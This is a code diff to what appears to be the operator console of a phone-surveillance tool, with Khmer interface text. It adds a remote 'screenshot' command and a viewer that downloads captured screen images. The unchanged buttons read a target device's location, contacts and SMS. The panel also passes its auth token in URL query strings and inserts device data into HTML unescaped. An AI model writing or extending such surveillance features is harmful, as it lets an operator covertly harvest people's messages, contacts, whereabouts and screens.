@@ -1662,7 +1662,7 @@ async function renderDevices() {
                 <td><span class="dot ${d.online ? 'on' : 'off'}" style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${d.online ? '#22c55e' : '#666'};margin-right:6px"></span>${d.online ? 'Online' : 'Offline'}</td>
                 <td>
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_location')">📍 Location</button>
-                  <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'make_call')">📞 Call</button>
+                  <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'screenshot')">📸 Screenshot</button>
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_contacts')">👥 Contacts</button>
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_sms')">📨 Read SMS</button>
                 </td>
@@ -1705,11 +1705,7 @@ async function renderDevices() {
 
 window.sendDeviceCmd = async function(userId, cmdType) {
   let payload = {};
-  if (cmdType === 'make_call') {
-    const phone = prompt('បញ្ចូលលេខទូរស័ព្ទ:');
-    if (!phone) return;
-    payload = { phone };
-  } else if (cmdType === 'get_contacts') {
+  if (cmdType === 'get_contacts') {
     const query = prompt('ស្វែងរក contact (ទទេ = យកទាំងអស់):') || '';
     payload = { query };
   } else if (cmdType === 'get_sms') {
@@ -1728,6 +1724,11 @@ window.sendDeviceCmd = async function(userId, cmdType) {
     // Show location details
     if (cmdType === 'get_location') {
       setTimeout(() => showLocationDetails(res.command.id, res.command.user_id), 500);
+    }
+
+    // Show screenshot
+    if (cmdType === 'screenshot') {
+      setTimeout(() => showScreenshot(res.command.id, res.command.user_id), 500);
     }
     
     renderDevices();
@@ -1907,9 +1908,42 @@ window.showLocationDetails = async function(cmdId, userId) {
   showModal('📍 ទីតាំងឧបករណ៍', html);
 };
 
+window.showScreenshot = async function(cmdId, userId) {
+  const commands = await api(`/device/commands?user_id=${userId}`);
+  const latest = commands.commands?.find(c => c.id === cmdId);
+  
+  if (!latest || !latest.result_data) {
+    toast('⏳ កំពុងរង់ចាំ screenshot...', false);
+    return;
+  }
+  
+  const data = latest.result_data;
+  const imgData = data.image || data.screenshot;
+  const ts = data.timestamp || latest.completed_at;
+  
+  if (!imgData) {
+    toast('❌ គ្មានរូបភាព', true);
+    return;
+  }
+  
+  const html = `
+    <div style="text-align:center">
+      <p style="margin-bottom:12px;color:#666;font-size:13px">📸 ថតនៅ: ${dt(ts)}</p>
+      <img src="data:image/png;base64,${imgData}" style="max-width:100%;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15)" />
+      <div style="margin-top:16px">
+        <a href="data:image/png;base64,${imgData}" download="screenshot_${userId}_${Date.now()}.png" class="btn primary" style="display:inline-block;text-decoration:none">⬇️ ទាញយករូបភាព</a>
+      </div>
+    </div>
+  `;
+  
+  showModal('📸 Screenshot', html);
+};
+
 function formatResultData(cmdType, data) {
   if (cmdType === 'get_location') {
     return `<a href="/admin/device-manager.html?user_id=${data.userId}&token=${encodeURIComponent(token)}" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រងទីតាំង">📍</a>`;
+  } else if (cmdType === 'screenshot') {
+    return `<a href="/admin/device-manager.html?user_id=${data.userId}&token=${encodeURIComponent(token)}" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រង screenshot">📸</a>`;
   } else if (cmdType === 'get_contacts') {
     const count = data.count || 0;
     return `<a href="/admin/device-manager.html?user_id=${data.userId}&token=${encodeURIComponent(token)}" target="_blank" style="color:#3B9AD9;font-size:20px;text-decoration:none" title="បើកគ្រប់គ្រង contacts (${count})">👥</a>`;
